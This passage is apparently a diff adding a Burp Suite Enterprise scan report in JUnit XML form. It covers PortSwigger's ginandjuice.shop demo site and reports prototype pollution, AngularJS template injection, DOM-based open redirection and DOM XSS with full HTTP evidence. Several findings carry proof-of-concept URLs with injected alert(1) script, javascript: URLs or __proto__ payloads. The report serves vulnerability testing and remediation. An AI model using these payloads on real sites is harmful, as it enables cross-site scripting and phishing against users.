+Set-Cookie: AWSALBCORS=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+Dynamic analysis:
+
+
+The client-side prototype pollution source __proto__[property] is read from the query string.
+
+
+
+The following proof of concept was generated for this issue: https://ginandjuice.shop/blog?__proto__[dcb52823]=vz084bkeo6
+
+
+
+
+
+
+References
+    
+- Testing for client-side prototype pollution in DOM Invader (https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution.html)
+
+- Web Security Academy: Prototype pollution (https://portswigger.net/web-security/prototype-pollution)
+
+
+
+Vulnerability Classifications
+    
+- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (https://cwe.mitre.org/data/definitions/1321.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+    </testsuite>
+    <testsuite failures="5" name="https://ginandjuice.shop:443/blog/?search=&amp;back=%2fblog%2f" tests="5">
+        <testcase name="Input returned in response (reflected)">
+            <failure message="Input returned in response (reflected) found at https://ginandjuice.shop/blog/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /blog/
+
+
+Issue Detail
+The value of the search request parameter is copied into the application's response.
+
+Issue Background
+Reflection of input arises when data is copied from a request and echoed into the application's immediate response.
+Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. 
+
+
+Evidence
+Request:
+GET /blog/?search=7jn318vmv0&back=%2fblog%2f HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/blog
+Cookie: session=vaKkvWiNmAdLgxPFgVk9cuDd86P76cu4; AWSALB=2uJcuPUkXsKR7NPSpca30RE9Hruly/XD6mqMvD89Mox1AnP81WA8KxtoE71HJpIMk40XnG9EWfgbGyA6AwCTW/dHoAGl+6K3zFYOaEmfespPRq2yMy1L74ODWhDa; AWSALBCORS=2uJcuPUkXsKR7NPSpca30RE9Hruly/XD6mqMvD89Mox1AnP81WA8KxtoE71HJpIMk40XnG9EWfgbGyA6AwCTW/dHoAGl+6K3zFYOaEmfespPRq2yMy1L74ODWhDa
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:37 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 8648
+Set-Cookie: AWSALB=DwVQU9gMmmW10LlG3E833QGt1jLTvRRWudO5maL8YKaqSbzsGwOoB9vsQCtlL3nO8LWzFYlBmn9KAdR6oyV0RXR1J0r8W4vsVwV4EHCbCMMGxjJIb/mNbVKQo3z5; Expires=Thu, 14 Sep 2023 10:59:37 GMT; Path=/
+Set-Cookie: AWSALBCORS=DwVQU9gMmmW10LlG3E833QGt1jLTvRRWudO5maL8YKaqSbzsGwOoB9vsQCtlL3nO8LWzFYlBmn9KAdR6oyV0RXR1J0r8W4vsVwV4EHCbCMMGxjJIb/mNbVKQo3z5; Expires=Thu, 14 Sep 2023 10:59:37 GMT; Path=/; SameSite=None; Secure
+X-Backend: a87a967f-b1e0-413d-bc23-5939b8e780aa
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip<input type=text placeholder='Search the blog...' name=search value="7jn318vmv0">Snip
+
+
+
+Vulnerability Classifications
+
+- CWE-20: Improper Input Validation (https://cwe.mitre.org/data/definitions/20.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Client-side template injection">
+            <failure message="Client-side template injection found at https://ginandjuice.shop/blog/" type="High"><![CDATA[
+Severity: High
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /blog/
+
+
+Issue Detail
+It is possible to inject arbitrary AngularJS expressions into the client-side template that is being used by the application.
+
+The payload 8766k{{a=(7*7.0)}}6p727 was submitted in the search parameter. This input was echoed unmodified in the application's response. The echoed input appears within a client-side AngularJS template, as designated by the "ng-app" directive on an enclosing HTML tag. The HTML page uses AngularJS v1.7.7.
+
+This proof-of-concept attack demonstrates that it is possible to inject arbitrary AngularJS expressions into the application's response. An attacker could use this in conjunction with a sandbox escape for AngularJS v1.7.7 to execute arbitrary JavaScript within the browser of a target user.
+
+Issue Background
+Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages. When a web page is rendered, the framework will scan the page for template expressions, and execute any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. As with normal cross-site scripting, the attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.
+
+Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).
+
+The security impact of client-side template injection vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a client-side template injection flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, client-side template injection should always be considered high risk. 
+
+Client-side template frameworks often implement a sandbox aimed at hindering direct execution of arbitrary JavaScript from within a template expression. However, these sandboxes are not intended to be a security control and can normally be bypassed.
+
+Browser cross-site scripting filters are typically unable to detect or prevent client-side template injection attacks.
+
+
+Issue Remediation
+If possible, avoid using server-side code to dynamically embed user input into client-side templates. If this is not practical, consider filtering out template expression syntax from user input prior to embedding it within client-side templates. 
+
+Note that HTML-encoding is not sufficient to prevent client-side template injection attacks, because frameworks perform an HTML-decode of relevant content prior to locating and executing template expressions.
+
+
+Evidence
+Request 1:
+GET /blog/?search=8766k%7b%7ba%3d(7*7.0)%7d%7d6p727&back=%2fblog%2f HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/blog
+Cookie: session=vaKkvWiNmAdLgxPFgVk9cuDd86P76cu4; AWSALB=2uJcuPUkXsKR7NPSpca30RE9Hruly/XD6mqMvD89Mox1AnP81WA8KxtoE71HJpIMk40XnG9EWfgbGyA6AwCTW/dHoAGl+6K3zFYOaEmfespPRq2yMy1L74ODWhDa; AWSALBCORS=2uJcuPUkXsKR7NPSpca30RE9Hruly/XD6mqMvD89Mox1AnP81WA8KxtoE71HJpIMk40XnG9EWfgbGyA6AwCTW/dHoAGl+6K3zFYOaEmfespPRq2yMy1L74ODWhDa
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:58 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 8661
+Set-Cookie: AWSALB=XwXRtf//5eal5rJMCoMPMmx2saxkxMkj5GJkgEB6UxxmOFwqC6LsHOOnxrn3oFO4CcC7Q00sfF+/6OiSzVsM++XiL2mLzz4R6SnDAwXSQEd23Mfrn3Ju3Tfv0mPF; Expires=Thu, 14 Sep 2023 10:59:58 GMT; Path=/
+Set-Cookie: AWSALBCORS=XwXRtf//5eal5rJMCoMPMmx2saxkxMkj5GJkgEB6UxxmOFwqC6LsHOOnxrn3oFO4CcC7Q00sfF+/6OiSzVsM++XiL2mLzz4R6SnDAwXSQEd23Mfrn3Ju3Tfv0mPF; Expires=Thu, 14 Sep 2023 10:59:58 GMT; Path=/; SameSite=None; Secure
+X-Backend: a87a967f-b1e0-413d-bc23-5939b8e780aa
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip<script type="text/javascript" src="/resources/js/angular_1-7-7.js">Snip<body ng-app>Snip<input type=text placeholder='Search the blog...' name=search value="8766k{{a=(7*7.0)}}6p727">Snip
+
+Request 2:
+GET /resources/js/angular_1-7-7.js HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=rWbNrl8HkFPpemLS2TItbN/G+ZUJJerNZUUYqSGyh/qnGpFnnFPnicDi6e57o71nGOtFMwgak36oM8wGjmyNcF/ChDCNHXa5XGjQAzDhqFbGT8zqPJxM01tGNiek; AWSALBCORS=rWbNrl8HkFPpemLS2TItbN/G+ZUJJerNZUUYqSGyh/qnGpFnnFPnicDi6e57o71nGOtFMwgak36oM8wGjmyNcF/ChDCNHXa5XGjQAzDhqFbGT8zqPJxM01tGNiek; session=TGr9vsvUtThcBAf7KxrPuy4frXmdLnkU
+
+
+
+Response 2:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:54 GMT
+Content-Type: application/javascript; charset=utf-8
+Content-Length: 195161
+Set-Cookie: AWSALB=m8Uv2FVWzJJ8VWsCcYDq6Q9WXawk3ZMVrZ6803QAe1G+LfMZ/NTNVe5UUq/7AQazf6dDwVIvfVBnfiLM8NK4SK5rHjvk/HNsHY//FbkTkn2appxQKp8R7sUmJd4u; Expires=Thu, 14 Sep 2023 10:58:54 GMT; Path=/
+Set-Cookie: AWSALBCORS=m8Uv2FVWzJJ8VWsCcYDq6Q9WXawk3ZMVrZ6803QAe1G+LfMZ/NTNVe5UUq/7AQazf6dDwVIvfVBnfiLM8NK4SK5rHjvk/HNsHY//FbkTkn2appxQKp8R7sUmJd4u; Expires=Thu, 14 Sep 2023 10:58:54 GMT; Path=/; SameSite=None; Secure
+Cache-Control: public, max-age=3600
+X-Backend: 6ee1d000-9aff-4799-bfe5-704c0280a506
+X-Frame-Options: SAMEORIGIN
+
+/*
+AngularJS v1.7.7
+(c) 2010-2018 Google, Inc. http://angularjs.org
+License: MIT
+*/
+(function(C){'use strict';function re(a){if(D(a))w(a.objectMaxDepth)&&(Wb.objectMaxDepth=Xb(a.objectMaxDepth)?a.objectMaxDepth:NaN),w(Snip
+
+
+
+References
+    
+- XSS without HTML: Client-Side Template Injection with AngularJS (https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs). This includes a list of known AngularJS sandbox escapes.
+
+- Web Security Academy: AngularJS sandbox escapes (https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox)
+
+- AngularJS Security Considerations (https://docs.angularjs.org/guide/security)
+
+- JavaScript MVC Security Pitfalls (https://code.google.com/p/mustache-security/)
+
+
+
+Vulnerability Classifications
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+- CWE-159: Failure to Sanitize Special Element (https://cwe.mitre.org/data/definitions/159.html)
+
+- CAPEC-588: DOM-Based XSS (https://capec.mitre.org/data/definitions/588.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Client-side prototype pollution">
+            <failure message="Client-side prototype pollution found at https://ginandjuice.shop/blog/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /blog/
+
+
+Issue Detail
+The client-side prototype pollution source __proto__[property]=value was found on this web site. The payload was injected into the query string part of the URL and the payload was later detected in the Object.prototype indicating that this website is vulnerable to client-side prototype pollution. This proof-of-concept demonstrates it's possible to control the Object.prototype via the query string.
+The following URL, https://ginandjuice.shop/blog/?search=&back=%2fblog%2f&__proto__[dcb52823]=kxp6d0als3, can be used as a proof of concept. 
+In order to exploit this vulnerability a relevant client-side prototype pollution gadget is required as well as this prototype pollution source. We recommend using DOM Invader (https://portswigger.net/blog/introducing-dom-invader) (a browser extension part of Burp Suite's embedded browser) to confirm this vulnerability and scan for gadgets.
+
+
+Issue Background
+
+A client-side prototype pollution source is any user-controlled JSON property, query string, or hash parameter that is converted to a JavaScript object and then merged with another object. This enables an attacker to use property keys, such as __proto__, to assign properties to the Object.prototype or other global prototypes.
+
+
+
+Client-side prototype pollution is not a vulnerability in its own right. However, when paired with a gadget, this may lead to vulnerabilities such as DOM XSS, which could enable the attacker to control JavaScript on the page.
+
+
+
+Issue Remediation
+
+Ensure that property keys, such as __proto__, constructor, and prototype are correctly filtered when merging objects. When creating objects, we recommend using the Object.create(null) API to ensure that your object does not inherit from the Object.prototype and, therefore, won't be vulnerable to prototype pollution.
+
+
+
+Evidence
+Request:
+GET /blog/?search=&back=%2fblog%2f HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/blog
+Cookie: session=exgjAKJhS9nSDQqEV3wBIjpG4ZQ3wjGv; AWSALB=wG2nI7fyPTnO7XqLe/ohsk5eJJxGYspWTR19IzMg+O9ZTbukvt+FNoEgBTou8yaQ5qqpRN9FAWyMjYugMMno5742nwk00p5uG3L+2AO/uQlfESUmF98Mhj5GrqiN; AWSALBCORS=wG2nI7fyPTnO7XqLe/ohsk5eJJxGYspWTR19IzMg+O9ZTbukvt+FNoEgBTou8yaQ5qqpRN9FAWyMjYugMMno5742nwk00p5uG3L+2AO/uQlfESUmF98Mhj5GrqiN
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:25 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11604
+Set-Cookie: AWSALB=hmqVAd8UfEd8iXHf8ugUyrHV71dq7oLqQeC3/IliD36QRKdN+a3a93ceh1/sHrdXvE2sm/keNj/HD3AyhJ+6dgyTIE4y5WjYnXLh4O7bcoo4SutjHHf4zsFtW0wL; Expires=Thu, 14 Sep 2023 10:58:25 GMT; Path=/
+Set-Cookie: AWSALBCORS=hmqVAd8UfEd8iXHf8ugUyrHV71dq7oLqQeC3/IliD36QRKdN+a3a93ceh1/sHrdXvE2sm/keNj/HD3AyhJ+6dgyTIE4y5WjYnXLh4O7bcoo4SutjHHf4zsFtW0wL; Expires=Thu, 14 Sep 2023 10:58:25 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+Dynamic analysis:
+
+
+The client-side prototype pollution source __proto__[property] is read from the query string.
+
+
+
+The following proof of concept was generated for this issue: https://ginandjuice.shop/blog/?search=&amp;back=%2fblog%2f&amp;__proto__[dcb52823]=kxp6d0als3
+
+
+
+
+
+
+References
+    
+- Testing for client-side prototype pollution in DOM Invader (https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution.html)
+
+- Web Security Academy: Prototype pollution (https://portswigger.net/web-security/prototype-pollution)
+
+
+
+Vulnerability Classifications
+    
+- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (https://cwe.mitre.org/data/definitions/1321.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Open redirection (DOM-based)">
+            <failure message="Open redirection (DOM-based) found at https://ginandjuice.shop/blog/" type="Low"><![CDATA[
+Severity: Low
+
+Confidence: Tentative
+
+Host: https://ginandjuice.shop
+
+Path: /blog/
+
+
+Issue Detail
+The application may be vulnerable to DOM-based open redirection. Data is read from location.search and passed to location.
+
+Issue Background
+DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.
+
+
+DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.
+
+Note: If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.
+
+
+Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.
+
+
+Issue Remediation
+The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.
+
+
+Evidence
+Request:
+GET /blog/?search=&back=%2fblog%2f HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/blog
+Cookie: session=exgjAKJhS9nSDQqEV3wBIjpG4ZQ3wjGv; AWSALB=wG2nI7fyPTnO7XqLe/ohsk5eJJxGYspWTR19IzMg+O9ZTbukvt+FNoEgBTou8yaQ5qqpRN9FAWyMjYugMMno5742nwk00p5uG3L+2AO/uQlfESUmF98Mhj5GrqiN; AWSALBCORS=wG2nI7fyPTnO7XqLe/ohsk5eJJxGYspWTR19IzMg+O9ZTbukvt+FNoEgBTou8yaQ5qqpRN9FAWyMjYugMMno5742nwk00p5uG3L+2AO/uQlfESUmF98Mhj5GrqiN
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:25 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11604
+Set-Cookie: AWSALB=hmqVAd8UfEd8iXHf8ugUyrHV71dq7oLqQeC3/IliD36QRKdN+a3a93ceh1/sHrdXvE2sm/keNj/HD3AyhJ+6dgyTIE4y5WjYnXLh4O7bcoo4SutjHHf4zsFtW0wL; Expires=Thu, 14 Sep 2023 10:58:25 GMT; Path=/
+Set-Cookie: AWSALBCORS=hmqVAd8UfEd8iXHf8ugUyrHV71dq7oLqQeC3/IliD36QRKdN+a3a93ceh1/sHrdXvE2sm/keNj/HD3AyhJ+6dgyTIE4y5WjYnXLh4O7bcoo4SutjHHf4zsFtW0wL; Expires=Thu, 14 Sep 2023 10:58:25 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+Dynamic analysis:
+
+
+Data is read from location.search and passed to location.
+
+
+
+
+- 
+The following value was injected into the source:
+
+?search=dyr47lky5f%27%22`'"/dyr47lky5f/><dyr47lky5f/\>nl39m1w2oi&&back=dyr47lky5f%27%22`'"/dyr47lky5f/><dyr47lky5f/\>nl39m1w2oi&%2fblog%2f
+
+
+
+- 
+The previous value reached the sink:
+
+dyr47lky5f'"`'"/dyr47lky5f/><dyr47lky5f/\>nl39m1w2oi
+
+
+
+- 
+The stack trace at source was:
+
+at Object.jQyco (<anonymous>:1:109813)
+at Object.xiELL (<anonymous>:1:521436)
+at Object._0x4dc2e1 [as proxiedGetterCallback] (<anonymous>:1:537599)
+at get search [as search] (<anonymous>:1:235611)
+at HTMLAnchorElement.onclick (https://ginandjuice.shop/blog/?search=&back=%2fblog%2f:123:191)
+at _0x119a7a (<anonymous>:1:142326)
+at Object.HJhfL (<anonymous>:1:6096)
+at _0x54465b (<anonymous>:1:145244)
+at _0x413e44 (<anonymous>:1:558773)
+
+
+
+- 
+The stack trace at the sink was:
+
+at Object.BavWH (<anonymous>:1:109569)
+at Object._0x4d51a4 [as locationSetterCallback] (<anonymous>:1:538487)
+at HTMLDocument.set (<anonymous>:1:237818)
+at HTMLAnchorElement.onclick (https://ginandjuice.shop/blog/?search=&back=%2fblog%2f:123:160)
+at _0x119a7a (<anonymous>:1:142326)
+at Object.HJhfL (<anonymous>:1:6096)
+at _0x54465b (<anonymous>:1:145244)
+at _0x413e44 (<anonymous>:1:558773)
+
+
+
+- 
+This was triggered by a click event with the following HTML:
+
+<a href="#" onclick="event.preventDefault(); location = new URLSearchParams(location.search).get(&qu
+
+
+- 
+The following proof of concept was generated for this issue:
+
+https://ginandjuice.shop/blog/?search=javascript:alert(1)&back=javascript:alert(1)%2fblog%2f
+
+
+
+
+
+
+
+References
+    
+- Web Security Academy: Open redirection (DOM-based) (https://portswigger.net/web-security/dom-based/open-redirection)
+
+
+
+Vulnerability Classifications
+
+- CWE-601: URL Redirection to Untrusted Site ('Open Redirect') (https://cwe.mitre.org/data/definitions/601.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Cross-site scripting (DOM-based)">
+            <failure message="Cross-site scripting (DOM-based) found at https://ginandjuice.shop/blog/" type="High"><![CDATA[
+Severity: High
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /blog/
+
+
+Issue Detail
+The application may be vulnerable to DOM-based cross-site scripting. Data is read from location.search and passed to document.write.
+
+Issue Background
+DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.
+
+DOM-based cross-site scripting arises when a script  writes controllable data into the HTML document in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.
+
+The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.
+
+Users can be induced to visit the attacker's crafted URL in various ways, similar to the usual attack delivery vectors for reflected cross-site scripting vulnerabilities.
+
+
+Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.
+
+
+Issue Remediation
+The most effective way to avoid DOM-based cross-site scripting vulnerabilities is not to dynamically write data from any untrusted source into the HTML document. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing script code into the document. In many cases, the relevant data can be validated on a whitelist basis, to allow only content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context that the data is to be inserted may need to involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence. 
+
+
+Evidence
+Request:
+GET /blog/?search=&back=%2fblog%2f HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/blog
+Cookie: session=exgjAKJhS9nSDQqEV3wBIjpG4ZQ3wjGv; AWSALB=wG2nI7fyPTnO7XqLe/ohsk5eJJxGYspWTR19IzMg+O9ZTbukvt+FNoEgBTou8yaQ5qqpRN9FAWyMjYugMMno5742nwk00p5uG3L+2AO/uQlfESUmF98Mhj5GrqiN; AWSALBCORS=wG2nI7fyPTnO7XqLe/ohsk5eJJxGYspWTR19IzMg+O9ZTbukvt+FNoEgBTou8yaQ5qqpRN9FAWyMjYugMMno5742nwk00p5uG3L+2AO/uQlfESUmF98Mhj5GrqiN
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:58:25 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11604
+Set-Cookie: AWSALB=hmqVAd8UfEd8iXHf8ugUyrHV71dq7oLqQeC3/IliD36QRKdN+a3a93ceh1/sHrdXvE2sm/keNj/HD3AyhJ+6dgyTIE4y5WjYnXLh4O7bcoo4SutjHHf4zsFtW0wL; Expires=Thu, 14 Sep 2023 10:58:25 GMT; Path=/
+Set-Cookie: AWSALBCORS=hmqVAd8UfEd8iXHf8ugUyrHV71dq7oLqQeC3/IliD36QRKdN+a3a93ceh1/sHrdXvE2sm/keNj/HD3AyhJ+6dgyTIE4y5WjYnXLh4O7bcoo4SutjHHf4zsFtW0wL; Expires=Thu, 14 Sep 2023 10:58:25 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+Dynamic analysis:
+
+
+Data is read from location.search and passed to document.write.
+
+
+
+
+- 
+The following value was injected into the source:
+
+?search=rpu656v269%27%22`'"/rpu656v269/><rpu656v269/\>fxp8mzd110&&back=rpu656v269%27%22`'"/rpu656v269/><rpu656v269/\>fxp8mzd110&%2fblog%2f
+
+
+
+- 
+The previous value reached the sink:
+
+<img src="/resources/images/tracker.gif?searchTerms=rpu656v269'"`'"/rpu656v269/><rpu656v269/\>fxp8mzd110">
+
+
+
+- 
+The stack trace at source was:
+
+at Object.jQyco (<anonymous>:1:109813)
+at Object.xiELL (<anonymous>:1:521436)
+at Object._0x4dc2e1 [as proxiedGetterCallback] (<anonymous>:1:537599)
+at get search [as search] (<anonymous>:1:235611)
+at https://ginandjuice.shop/blog/?search=&back=%2fblog%2f:80:74
+
+
+
+- 
+The stack trace at the sink was:
+
+at Object.lbDRJ (<anonymous>:1:107180)
+at _0x3878e6 (<anonymous>:1:540000)
+at Object.pcxOb (<anonymous>:1:102845)
+at Object.njqmI (<anonymous>:1:431409)
+at Object.gCySh (<anonymous>:1:448822)
+at HTMLDocument.write (<anonymous>:1:450335)
+at trackSearch (https://ginandjuice.shop/blog/?search=&back=%2fblog%2f:78:38)
+at https://ginandjuice.shop/blog/?search=&back=%2fblog%2f:82:29
+
+
+
+- 
+The following proof of concept was generated for this issue:
+
+https://ginandjuice.shop/blog/?search='"><script>alert(1)</script>&back='"><script>alert(1)</script>%2fblog%2f
+
+
+
+
+
+
+
+References
+	
+- Web Security Academy: Cross-site scripting (https://portswigger.net/web-security/cross-site-scripting)
+
+- Web Security Academy: DOM-based cross-site scripting (https://portswigger.net/web-security/cross-site-scripting/dom-based)
+
+
+
+Vulnerability Classifications
+
+- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (https://cwe.mitre.org/data/definitions/79.html)
+
+- CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) (https://cwe.mitre.org/data/definitions/80.html)
+
+- CWE-116: Improper Encoding or Escaping of Output (https://cwe.mitre.org/data/definitions/116.html)
+
+- CWE-159: Failure to Sanitize Special Element (https://cwe.mitre.org/data/definitions/159.html)
+
+- CAPEC-588: DOM-Based XSS (https://capec.mitre.org/data/definitions/588.html)
+
